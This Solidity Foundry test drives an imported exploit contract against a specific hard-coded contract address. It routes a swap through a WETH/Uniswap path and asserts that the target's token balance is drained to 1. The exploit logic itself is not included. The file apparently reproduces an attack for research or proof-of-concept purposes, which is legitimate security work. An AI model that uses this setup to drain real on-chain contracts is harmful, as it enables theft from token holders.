// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Exploit.sol";
import "../src/IERC20.sol";

contract ExploitTest is Test {
    Exploit public exploit;

    address[] tokens = [
        address(0x69A95185ee2a045CDC4bCd1b1Df10710395e4e23)
    ];

    address[][] tokenPath = [
        [
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            address(0x69A95185ee2a045CDC4bCd1b1Df10710395e4e23)
        ]
    ];

    function setUp() public {
        exploit = new Exploit();
        vm.deal(address(exploit), 0.003 ether);
    }

    function testExploit() public {
        address target = address(0x2cc4A6C6D5Ff183d7E3c7e33e9Bc10d55BDBaEA8);
        address swap = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        exploit.exploit(target, tokens, tokenPath, swap);
        
        uint256 targetBalance = IERC20(tokens[0]).balanceOf(target);
        assertEq(targetBalance, 1);
    }
}
